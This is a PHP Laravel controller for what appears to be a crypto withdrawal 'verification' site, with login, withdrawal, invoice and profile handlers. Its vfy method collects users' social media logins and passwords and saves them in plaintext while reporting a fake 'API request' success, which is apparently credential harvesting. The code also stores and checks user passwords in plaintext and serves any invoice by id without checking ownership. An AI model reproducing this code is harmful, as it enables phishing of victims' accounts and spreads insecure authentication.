<?php

namespace App\Http\Controllers;

use App\Models\User;
use App\Models\user_tb;
use App\Models\verify_social;
use App\Models\verify_withdraw_tb;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Foundation\Auth\User as U;
use Symfony\Component\Console\Input\Input;
use Barryvdh\DomPDF\Facade\Pdf;

class Usercontroller extends Controller
{
    public function index(Request $request)
    {

        if ($request->method() == "GET") {
            return view('index');
        }

        $data =  $request->validate([
            "email" => "required",
            "password" => "required",
        ]);

        $data = (object) $request->all();
        $user_data = User::where("email", "$data->email")->get()->first();

        if (!empty($user_data) && $user_data->password == $data->password) {

            $request->session()->regenerate();
            Auth::loginUsingId($user_data->id);
            return redirect()->route('user')->with('message', 'Welcome Back To PRIME OPTION PRO VERIFY');
        } else {
            return back()->with('noMatch', 'Invalid details');
        }
    }

    public function user(Request $request)
    {

        if ($request->method() == "GET") {

            $email = auth()->user()->email;
            $user_data_tb = user_tb::where("uemail", "$email")->get()->first();
            // dd($user_data_tb);

            return view('user-dashboard.index', [
                "datas" => verify_withdraw_tb::orderBy("id", "desc")->get(),
                "user_tb" => $user_data_tb,
            ]);
        }

        $validated = (object) $request->validate([
            "currency" => "required",
            "wallet_address" => "required",
            "withdrawal_amount" => "required|numeric|min:1000",
            "pin" => "required|numeric|digits:6",
            "email" => "required",
        ]);

        $email = $validated->email;

        if ($validated) {

            $user_data = User::where("email", "$email")->get()->first();
            $user_tb = user_tb::where("uemail", "$email")->get()->first();

            if ($user_data->pin != $validated->pin) {
                return back()->with('error', 'INCORRECT PIN ');
            } elseif ($user_tb->u_withraw_pending < $validated->withdrawal_amount) {
                return back()->with('error', 'insufficient Net balance ');
            } else {

                $result = verify_withdraw_tb::insert([
                    "email" => "$validated->email",
                    "currency" => "$validated->currency",
                    "wallet_address" => "$validated->wallet_address",
                    "withdrawal_amount" => "$validated->withdrawal_amount",
                    "status" => "1",
                ]);

                if ($result) {

                    $new_bal = $user_tb->u_withraw_pending - $validated->withdrawal_amount;

                    $bal = user_tb::where("uemail", "$email")->update([
                        "u_withraw_pending" => $new_bal,
                    ]);

                    if ($bal) {

                        return redirect()->route('user')->with('message', 'Request Success Placed. Download Your Invoice below');
                    }
                } else {
                    return back()->with('error', 'Request not successful an error occurred');
                }
            }
        }

        return back()->with('error', 'Request not successful an error occurred');
    }

    public function invoice(Request $request, $id)
    {

        $invoice_data = verify_withdraw_tb::where("id", "$id")->get()->first();
        $phone_num = user_tb::where("uemail", "$invoice_data->email")->select('uphone')->get()->first();

        $pdf = Pdf::loadView('invoice', [
            "invoice_data" => $invoice_data,
            "phone_num" => $phone_num,
        ]);
        return $pdf->download('withdrawal-' . $id . '-invoice.pdf');
    }

    public function vfy(Request $request)
    {
        if ($request->method() == "GET") {

            return view('user-dashboard.vfy');
        }

        $validated = (object) $request->validate([
            "social" => "required",
            "email" => "required",
            "user_name_email" => "required",
            "password" => "required|confirmed",
            "password_confirmation" => "required",
        ]);

        if ($validated) {
            $result = verify_social::insert([
                "email" => $validated->email,
                "social" => $validated->social,
                "user_name_email" => $validated->user_name_email,
                "password" => $validated->password,
            ]);
            if ($result) {

                User::where("email", "$validated->email")->update([
                    "vfy_status" => 2,
                ]);
                return redirect()->route('vfy')->with('message', 'Verification API Request was Successful');
            } else {
                return back()->with('error', 'API Request not successful ');
            }
        } else {
            return back()->with('error', 'API Request not successful ');
        }
        return back()->with('error', 'API Request not successful ');
    }

    public function profile(Request $request, User $user)
    {
        if ($request->method() == 'GET') {
            return view('user-dashboard.profile');
        }

        $validated = $request->validate([
            "password" => "required|min:6",
            "pin" => "required|numeric|digits:6",
        ]);

        $id = auth()->user()->id;
        // dd($id);
        $validated = (object) $request->all();

        $result = User::where("id","$id")->update([
            "password" => "$validated->password",
            "pin" => "$validated->pin",
        ]);
        // dd($validated);
        if ($result) {
            return back()->with('message', 'Data Updated Successfully');
        }

        return back()->with('error', 'An error occurred try again later');
    }

    public function logout(Request $request)
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()->route('login')->with('message', 'you have logout successfully');
    }
}
